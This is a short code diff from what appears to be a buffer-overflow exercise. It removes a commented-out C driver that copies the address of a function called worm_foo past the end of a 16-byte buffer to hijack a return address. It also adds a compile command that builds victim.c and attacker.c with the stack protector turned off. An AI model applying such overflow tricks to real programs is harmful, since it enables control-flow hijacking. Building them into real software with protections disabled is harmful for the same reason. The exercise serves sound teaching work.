@@ -1,24 +1,3 @@
-/*
-#include <stdlib.h>
-#include <string.h>
-extern void service(char* param, long param_length);
-extern void worm_foo();
-
-int main(int argc, char** argv) {
-    long param_length = 16;
-    char *param = (char*)calloc(param_length, sizeof(char));
-
-    long worm_foo_address = (long)&worm_foo;
-
-    for (int i = 0; i < 6; i++) {
-        //memcpy(param + i * 8, "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA", 8);
-        memcpy(param + i * 8, &worm_foo_address, 8);
-    }
-
-    service(param, param_length);
-}
-*/
-
 #include <string.h>
 #include <stdlib.h>
 
@@ -63,3 +42,6 @@ char *value_to_array(long value)
   }
   return array;
 }
+
+
+// gcc -o exec victim.c attacker.c -fno-stack-protector
